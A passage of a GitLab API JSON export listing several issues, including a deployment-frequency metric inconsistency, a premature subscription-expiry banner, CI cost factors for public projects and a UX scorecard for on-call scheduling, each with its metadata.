all environments, even if they are not production environments, and the metric is measured based on the time a deployment is created. In contrast, the group-level VSA metric only shows deployments to production environments, and measures from the time a deployment finishes. This is confusing to users who don't have a production environment properly configured because they see a deployment frequency metric at the project level but can't see one at the group level and don't understand why. \n\nFour separate customers have contacted GitLab over the past few weeks indicating that the Deployment Frequency metric in VSA isn't working the way they would expect. As an example, see https://gitlab.com/gitlab-org/gitlab/-/issues/335053. \n\n### Proposal\n\n1. As a first iteration to reduce the inconsistencies for Premium and Ultimate customers, do a license check for the deployment frequency metric in both project and group level VSA and display a DORA4 API-based deployment frequency metric tile for all Premium and Ultimate customers.\n1. Update the documentation to clearly explain the difference in how the deployment frequency is calculated for the Free tier and the paid tiers.\n\n### Out of scope\n\nFor now, Free users will still see the deployment metric in project-level VSA, calculated the old way (all environments and from the time a deployment is created). They will not see a deployment metric at the group level","state":"closed","created_at":"2021-07-29T18:55:00.394Z","updated_at":"2022-08-09T19:57:35.446Z","closed_at":"2021-09-17T16:03:24.491Z","closed_by":{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"},"labels":["backend","customer","devops::manage","documentation","group::optimize","priority::2","release post item::in review","section::dev","tw-weight::3","type::bug","workflow::production"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"}],"author":{"id":4447217,"username":"ljlane","name":"Larissa Lane","state":"blocked","avatar_url":"https://secure.gravatar.com/avatar/ac4027d3a4e3bd62740ea1443a42f6c5?s=80\u0026d=identicon","web_url":"https://gitlab.com/ljlane"},"type":"ISSUE","assignee":{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"},"user_notes_count":14,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337256","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337256","notes":"https://gitlab.com/api/v4/projects/278964/issues/337256/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337256/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337256","relative":"#337256","full":"gitlab-org/gitlab#337256"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91109566,"iid":337250,"project_id":278964,"title":"Self-Managed: Subscription expiration banner shown before subscription can be renewed","description":"In gitlab-org/customers-gitlab-com#3268, the ability for customers to renew existing subscriptions has been restricted to 15 days prior to expiration.  However, the in-app warning banner doesn't necessarily jive with that restriction at the moment.  We show the \"subscription expiring\" banner at about 30 days, with a link directly to CustomerDot:\n\n![Screenshot_from_2021-07-28_08-34-46](/uploads/635de569b621b44a52b550fb63bea956/Screenshot_from_2021-07-28_08-34-46.png)\n\nBut the customer cannot renew yet, and this does [generate some confusion](https://gitlab.zendesk.com/agent/tickets/227119), and in worst cases, leads to the purchase of a new, superfluous license.\n\nCustomer in support ticket is on GitLab 13.12.  \nI tested in GitLab 14.1\n\nSee also: gitlab-org/customers-gitlab-com#3377\n\n\n## Proposal\n\n- [x] Don't show the banner until 15 days prior to expiration https://gitlab.com/gitlab-org/gitlab/-/merge_requests/78000\n- [x] Update button text to `That's OK, I don't want to renew` https://gitlab.com/gitlab-org/gitlab/-/merge_requests/69415\n- [x] Update wording on the banner https://gitlab.com/gitlab-org/gitlab/-/merge_requests/69415\n  ```\n   Your subscription expires in [X] days.\n   Your **Premium** subscription expires on [XXXX-XX-XX]. After that date, you cannot create issues or merge requests, or use many other features.\n   ```","state":"closed","created_at":"2021-07-29T18:33:42.196Z","updated_at":"2022-01-24T22:06:18.532Z","closed_at":"2022-01-14T16:31:20.039Z","closed_by":{"id":4159190,"username":"tyleramos","name":"Tyler Amos","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4159190/avatar.png","web_url":"https://gitlab.com/tyleramos"},"labels":["UI text","[deprecated] Category:Provision","auto updated","backend","customer","devops::fulfillment","group::provision","missed:14.3","missed:14.6","section::fulfillment","type::bug","workflow::production"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":4159190,"username":"tyleramos","name":"Tyler Amos","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4159190/avatar.png","web_url":"https://gitlab.com/tyleramos"}],"author":{"id":4447183,"username":"kevenhughes","name":"Keven Hughes","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4447183/avatar.png","web_url":"https://gitlab.com/kevenhughes"},"type":"ISSUE","assignee":{"id":4159190,"username":"tyleramos","name":"Tyler Amos","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4159190/avatar.png","web_url":"https://gitlab.com/tyleramos"},"user_notes_count":49,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337250","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":3,"completed_count":3},"weight":5,"blocking_issues_count":0,"has_tasks":true,"task_status":"3 of 3 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337250","notes":"https://gitlab.com/api/v4/projects/278964/issues/337250/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337250/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337250","relative":"#337250","full":"gitlab-org/gitlab#337250"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6383,"epic":{"id":310864,"iid":6383,"title":"THEME: Maintenance and Support","url":"/groups/gitlab-org/-/epics/6383","group_id":9970,"human_readable_end_date":"Nov 16, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91108333,"iid":337245,"project_id":278964,"title":"Backend: Harden CI limit for public projects","description":"## Problem to solve \n\nIn https://gitlab.com/gitlab-org/gitlab/-/issues/243722 we give a cost factor `0.008` to all public projects. Before that, public projects in namespaces created before July 2021 had unlimited CI minutes. With https://gitlab.com/gitlab-org/gitlab/-/issues/243722 we have put an end to unlimited CI minutes.\n\nAs we do https://gitlab.com/gitlab-org/gitlab/-/issues/346400 we then need to raise the baseline cost factor for public projects that are not `public forks` to `1`, so that `0.008` cost factor applies only to `public forks`.\n\n## Proposal \n\n- Raise default cost factor for public projects from `0.008` to `1.0`. \n- Ensure that the rules for `public forks get cost factor 0.008` and rules for `OSS projects get cost factor .5` prevail over this cost factor\n\n### Cost Factor proposal\n\n* Now - Cost factor .008\n* Sept 1 (15.4) - Set Cost Factor to .04 - issue for SRE team - https://gitlab.com/gitlab-com/gl-infra/production/-/issues/7628\n* Oct 1 (15.5) - Set Cost Factor to 1 - issue for SRE team - https://gitlab.com/gitlab-com/gl-infra/production/-/issues/7640\n    * As soon as the cost factor is set to `1` our [algorithm that selects the lowest cost factor](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/93046#note_1054840842) could select `0.5` for public Open Source plan projects. We need to document that.\n\n## Acceptance criteria / testing\n\n- A user on Free (or any) plan is charged with a `0.008` cost factor if they run a pipeline on a public fork of a public project.\n- A user on any plan is charged with a `1` cost factor if they run a pipeline on a project that is not a `public fork of a public project`.\n\n## Technical Work\n\nWe opened 2 change management issues for the SRE team here: \n\n- https://gitlab.com/gitlab-com/gl-infra/production/-/issues/7628\n- https://gitlab.com/gitlab-com/gl-infra/production/-/issues/7640\n\nOnce those issues are closed ~\"group::pipeline execution\"  verify this [via cost factor logging](https://log.gprd.gitlab.net/goto/bbd94330-2551-11ed-b86b-d963a1a6788e) and close this one out.","state":"closed","created_at":"2021-07-29T17:59:49.293Z","updated_at":"2022-10-21T12:03:09.723Z","closed_at":"2022-10-04T07:58:23.055Z","closed_by":{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"},"labels":["CI minutes","Category:Continuous Integration","Deliverable","FY23::Q3","OKR","Verify::P2","auto updated","backend","devops::verify","documentation","feature::addition","group::pipeline execution","needs investigation","pipeline abuse prevention","quad-planning::complete-no-action","section::ops","type::feature","workflow::production"],"milestone":{"id":2453027,"iid":77,"group_id":9970,"title":"15.5","description":"","state":"active","created_at":"2022-02-03T22:29:56.909Z","updated_at":"2022-02-03T22:29:56.909Z","due_date":"2022-10-17","start_date":"2022-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/77"},"assignees":[{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"}],"author":{"id":4905402,"username":"jreporter","name":"Jackie Porter","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4905402/avatar.png","web_url":"https://gitlab.com/jreporter"},"type":"ISSUE","assignee":{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"},"user_notes_count":130,"merge_requests_count":0,"upvotes":2,"downvotes":1,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337245","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337245","notes":"https://gitlab.com/api/v4/projects/278964/issues/337245/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337245/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337245","relative":"#337245","full":"gitlab-org/gitlab#337245"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5653,"epic":{"id":231355,"iid":5653,"title":"CI minutes limits for public projects on GitLab.com","url":"/groups/gitlab-org/-/epics/5653","group_id":9970,"human_readable_end_date":"Feb 17, 2023","human_readable_timestamp":"\u003cstrong\u003e1\u003c/strong\u003e month remaining"},"iteration":null,"health_status":"on_track"},{"id":91106189,"iid":337237,"project_id":278964,"title":"UX Scorecard - Monitor: FY22-Q3 - Creating an on-call schedule","description":"\u003c!--\n \nTitle should be: UX Scorecard - {{Stage Group}} FY{{YY}}-Q{{quarter number}} - {{Title or Description of the Evaluated Workflow / JTBD}}\n(e.g. “UX Scorecard - Create:Source Code FY21-Q1 - Obtaining screenshots from testing artifacts)\n\nIf this UX Scorecard is related to an OKR, append ~OKR to the /label quick action below to automatically add the 'OKR' label.\n\n--\u003e\n\n- **Personas**: [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer), [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer), [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)\n- **JTBD**: I want to set up on-call schedules to handle my alerts so I can be confident that, if an alert is firing, the appropriate people will be paged.\n- **Previous score and scorecard**: N/A\n- **Benchmark score**: B- (3.73)\n- [**Walkthrough video**](https://youtu.be/6dnsuQRw-NI)\n- [**Walkthrough deck**](https://docs.google.com/presentation/d/1jmSpryH9dRbTrGxsd8AeFZy6CLdZ8GZ3MFq_JFTQHDs/edit?usp=sharing)\n- **Scoring Notes**: [Scorecard heuristics](https://docs.google.com/spreadsheets/d/1QGzRuNrWK3Ia-ynPKWRoBieM8ft0qwuDb8aHG8nBhII/edit?usp=sharing)\n- **Recommendations**: Full list of issues visible in the linked issues widget.\n\n## Experience Maps\n\n### Paid group, Maintainer | Creating an on-call schedule \u0026 escalation policies.\n![image](/uploads/69e78adcea1c106990bc640aecb93f78/image.png)\n\n\n### Paid group, non-maintainer | Creating an on-call schedule \u0026 escalation policies. \n\n![image](/uploads/32f39903040f2fea5d21c731c7fa4bdd/image.png)\n\n\n### Free user | Creating an on-call schedule \u0026 escalation policies.\n\n![image](/uploads/fcd4e7a870831aef07e4f04bba978a89/image.png)\n\n#### [🔍 View Mural](https://app.mural.co/t/gitlab2474/m/gitlab2474/1628838224425/7d69f84651be4ef52001d9cea688fc7052f591bf?sender=kcomoli8464)\n\n## Score\n\nThe score excludes the Non-maintainer and free user journeys above.\n\n#### B- (3.73)\n\n[View scoring sheet](https://docs.google.com/spreadsheets/d/1QGzRuNrWK3Ia-ynPKWRoBieM8ft0qwuDb8aHG8nBhII/edit?usp=sharing)\n\n## Heuristic Buddy UX Scorecard Checklist\n\nThe Heuristic Buddy UX Scorecards are a twist on our UX Scorecard process. These are specifically designed to help identify areas of usability and learnability improvements. They are to be completed by a designer who does not work within the same product area(s) the job can be completed in. [Learn more about UX Scorecards](https://about.gitlab.com/handbook/engineering/ux/ux-scorecards/)\n\nThe initial preparation is completed by the Group Product Designer. When the preparation has been completed they will hand it over to the Heuristic Buddy to complete the evaluation who will hand it back to the Group Product Designer when completed to add any recommendations. Read through the steps below for details.\n\n### Group Product Designer (Expert)\n\n1. [x] Add this issue to the stage group epic for the corresponding UX scorecards. Verify that the \"UX scorecard\" label is applied.\n1. [x] After working with your PM to identify a top job, write it using the Job to be Done (JTBD) format: `When [situation], I want to [motivation], so I can [expected outcome]`. Review with your manager to ensure your JTBD is written at the appropriate level. Remember, a JTBD is not a user story, it should not directly reference a solution and should be tool agnostic.\n1. [x] Make note of which [personas](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/) might be performing the job, and link to them from this issue's description. Keeping personas in mind allows us to make the best decisions to address specific problems and pain points. Note: Do not include a persona in your JTBD format, as multiple types of users may complete the same job.\n1. [x] If your JTBD spans more than one stage group, that’s great! Review your JTBD with a designer from that stage group for accuracy. Note: This stage group's designer cannot be your Heuristic Buddy.\n1. [x] Consider whether you need to include additional scenarios related to onboarding.\n1. [x] Ping your Heuristic Buddy and let them know it's ready for them to conduct the evaluation.\n1. [x] Work with your Heuristic Buddy to ensure they'll be evaluating GitLab in the correct environment setup that is appropriate to a new user attempting to complete the JTBD that you've selected.\n\n### Heuristic Buddy (Evaluator)\n\n1. [x] Review the current experience, noting where you expect a user's high and low points to be based on our [UX Heuristics](https://about.gitlab.com/handbook/engineering/ux/heuristics/). Using an experience map, such as the one found in [this template](https://app.mural.co/template/6b2c082d-d81a-4a3b-9fff-37525ac9e173/dcdc71d4-1fce-4fe1-ae98-81267bd232ea), capture the screens and jot down observations. Ideally, use our [scoring template](https://docs.google.com/spreadsheets/d/1Z_70fDg578wu8j_kta3vSLOHWv-BEJ1zuqniyBQUTeI/edit#gid=0).\n    1. During the evaluation strive to wear the hat of the persona relevant to the JTBD and while doing so try to see the UI from their perspective as if they were a new user. \n    1. As you progress through your evaluation this will be easy to forget so it's recommended to put a reminder somewhere in your view, such as a post-it stuck on your monitor that says \"You're a new user!\"\n1. [x] Use the [**Grading Rubric**](https://about.gitlab.com/handbook/engineering/ux/heuristics/#scoring) to provide an overall measurement that becomes the **Benchmark score** for the experience (one grade per JTBD), and add it to this issue's description. Document the score in the [UX Scorecard Spreadsheet](https://drive.google.com/drive/u/0/search?lfhs=2\u0026q=ux%20scorecard%20scoring%20template).\n1. [x] Once testing is complete, create a walkthrough video that documents what you experienced when completing the job in GitLab. Begin the video with a contextual introduction including: \n    1. Your role, stage group\n    1. Specify how you conducted the heuristic evaluation\n    1. Add a short introduction describing the JTBD and the purpose of the UX scorecard (i.e. you're performing the evaluation in partnership with {stage group} and {product designer}. \n    1. This is not a \"how-to\" video, but instead should help build empathy for users by clearly showing areas of potential frustration and confusion. (You can point out where the experience is positive, too.) \n    1. At the end of the video, make sure to include narration of the Benchmark Score. Examples [here](https://www.youtube.com/watch?v=wCnpEGhS8uk\u0026feature=youtu.be) and [here](https://www.youtube.com/watch?v=MkTOwTxsoL8).\n   - The walkthrough video shouldn't take you long to create. Don't worry about it being polished or perfect, it's more important to be informative.\n1. [x] Post your video to the [GitLab Unfiltered YouTube](https://www.youtube.com/channel/UCMtZ0sc1HHNtGGWZFDRTh5A) channel, and link to it from this issue's description.\n1. [x] Link to your video in the [Engineering Week in Review](https://docs.google.com/document/d/1EkfzI85aqw8chYDBf2GLRvjKEa3s0FWHMI3u0DIr-xg/edit).\n1. [x] Once the evaluation has been completed ping the Stage Group Product Designer in this issue letting them know it's ready for their review.\n\n### Group Product Designer (Expert)\n\n1. [x] [Create a recommendation issue](https://gitlab.com/gitlab-org/gitlab-design/issues/new?issuable_template=UX%20Scorecard%20Part%202) for this JTBD and add it to the same stage group epic as this issue.  \n   1. Add a link to your recommendation issue(s) to this issue.","state":"closed","created_at":"2021-07-29T17:05:54.426Z","updated_at":"2022-12-20T15:26:23.694Z","closed_at":"2021-08-23T18:19:19.221Z","closed_by":{"id":2799498,"username":"ameliabauerly","name":"Amelia Bauerly","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2799498/avatar.png","web_url":"https://gitlab.com/ameliabauerly"},"labels":["OKR","UX","UX scorecard","auto updated","devops::monitor","group::respond","section::ops"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":2799498,"username":"ameliabauerly","name":"Amelia Bauerly","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2799498/avatar.png","web_url":"https://gitlab.com/ameliabauerly"}],"author":{"id":2799498,"username":"ameliabauerly","name":"Amelia Bauerly","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2799498/avatar.png","web_url":"https://gitlab.com/ameliabauerly"},"type":"ISSUE","assignee":{"id":2799498,"username":"ameliabauerly","name":"Amelia Bauerly","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2799498/avatar.png","web_url":"https://gitlab.com/ameliabauerly"},"user_notes_count":22,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337237","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":14,"completed_count":14},"weight":4,"blocking_issues_count":0,"has_tasks":true,"task_status":"14 of 14 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337237","notes":"https://gitlab.com/api/v4/projects/278964/issues/337237/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337237/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337237","relative":"#337237","full":"gitlab-org/gitlab#337237"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6490,"epic":{"id":316897,"iid":6490,"title":"UX Scorecards  - Monitor","url":"/groups/gitlab-org/-/epics/6490","group_id":9970,"human_readable_end_date":"Sep 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null}]